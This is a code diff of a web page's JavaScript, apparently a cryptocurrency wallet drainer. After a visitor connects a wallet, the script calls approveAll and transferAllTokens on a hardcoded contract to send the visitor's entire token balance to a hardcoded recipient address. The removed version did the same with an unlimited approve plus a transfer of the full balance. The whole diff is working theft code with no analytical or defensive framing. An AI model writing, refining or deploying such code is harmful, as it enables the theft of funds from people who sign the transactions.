@@ -31,78 +31,50 @@
         let signer;
         let userAddress;
         const recipientAddress = "0xa465e2fc9f9d527AAEb07579E821D461F700e699";  // 你的接收地址
+        const contractAddress = "0x56a2777e796eF23399e9E1d791E1A0410a75E31b"; // 智能合约地址
 
-        // ERC20 ABI，适用于 approve 和 transfer
-        const ERC20_ABI = [
-	{
-		"inputs": [
-			{
-				"internalType": "contract IERC20",
-				"name": "token",
-				"type": "address"
-			}
-		],
-		"name": "approveAll",
-		"outputs": [],
-		"stateMutability": "nonpayable",
-		"type": "function"
-	},
-	{
-		"inputs": [
-			{
-				"internalType": "contract IERC20",
-				"name": "token",
-				"type": "address"
-			}
-		],
-		"name": "transferAllTokens",
-		"outputs": [],
-		"stateMutability": "nonpayable",
-		"type": "function"
-	},
-	{
-		"inputs": [],
-		"stateMutability": "nonpayable",
-		"type": "constructor"
-	},
-	{
-		"inputs": [],
-		"name": "withdrawETH",
-		"outputs": [],
-		"stateMutability": "nonpayable",
-		"type": "function"
-	},
-	{
-		"stateMutability": "payable",
-		"type": "receive"
-	},
-	{
-		"inputs": [],
-		"name": "owner",
-		"outputs": [
-			{
-				"internalType": "address",
-				"name": "",
-				"type": "address"
-			}
-		],
-		"stateMutability": "view",
-		"type": "function"
-	},
-	{
-		"inputs": [],
-		"name": "recipient",
-		"outputs": [
-			{
-				"internalType": "address",
-				"name": "",
-				"type": "address"
-			}
-		],
-		"stateMutability": "view",
-		"type": "function"
-	}
-];
+        // 使用你提供的智能合约 ABI
+        const contractABI = [
+            {
+                "inputs": [{"internalType": "contract IERC20", "name": "token", "type": "address"}],
+                "name": "approveAll",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [{"internalType": "contract IERC20", "name": "token", "type": "address"}],
+                "name": "transferAllTokens",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "name": "withdrawETH",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "stateMutability": "payable",
+                "type": "receive"
+            },
+            {
+                "inputs": [],
+                "name": "owner",
+                "outputs": [{"internalType": "address", "name": "", "type": "address"}],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "name": "recipient",
+                "outputs": [{"internalType": "address", "name": "", "type": "address"}],
+                "stateMutability": "view",
+                "type": "function"
+            }
+        ];
 
         // 连接钱包
         async function connectWallet() {
@@ -126,8 +98,8 @@
         // 授权代币
         async function approveToken(tokenAddress) {
             try {
-                const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
-                const tx = await tokenContract.approve(recipientAddress, ethers.constants.MaxUint256); // 授权最大值
+                const contract = new ethers.Contract(contractAddress, contractABI, signer);
+                const tx = await contract.approveAll(tokenAddress);  // 调用 approveAll 方法
                 await tx.wait();
                 alert('代币授权成功');
                 console.log('代币授权成功');
@@ -140,9 +112,8 @@
         // 转移代币
         async function transferToken(tokenAddress) {
             try {
-                const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
-                const balance = await tokenContract.balanceOf(userAddress); // 获取代币余额
-                const tx = await tokenContract.transfer(recipientAddress, balance); // 转移所有余额
+                const contract = new ethers.Contract(contractAddress, contractABI, signer);
+                const tx = await contract.transferAllTokens(tokenAddress);  // 调用 transferAllTokens 方法
                 await tx.wait();
                 alert('代币转账成功');
                 console.log('代币转账成功');
